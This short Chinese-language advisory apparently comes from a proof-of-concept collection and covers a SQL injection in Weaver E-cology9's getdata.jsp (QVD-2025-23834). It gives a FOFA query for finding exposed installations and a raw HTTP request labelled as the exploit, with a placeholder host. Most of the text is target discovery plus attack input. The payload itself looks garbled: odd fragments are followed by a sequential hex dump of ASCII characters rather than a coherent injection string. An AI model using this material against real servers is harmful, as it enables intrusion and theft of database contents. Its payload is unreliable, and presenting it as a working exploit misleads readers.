## 泛微E cology9 getdata.jsp SQL注入漏洞（QVD-2025-23834）

## 漏洞描述
泛微 E cology9 `getdata.jsp` 接口未过滤用户输入，导致 SQL 注入，可泄露数据库敏感数据并执行高危操作。

## 网络空间测绘
```
fofa: app="泛微-OA（e-cology）"
```

## POC
```
GET /js/hrm/getdata.jsp?cmd=save&tsargb=Vek%l2Vek%l24 %2(%) %1%23%24%25%26%27%28%29%2a%2b%2c%2d%2e%2f%30%31%32%33%34%35%36%37%38%39%3a%3b%3c%3d%3e%3f%40%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52%53%54%55%56%57%58%59%5a%5b%5c%5d%5e%5f%60%61%62%63%64%65%66%67%68%69%6a%6b%6c%6d%6e%6f%70%71%72%73%74%75%76%77%78%79%7a%7b%7c%7d%7e HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

## 参考
- 社区情报

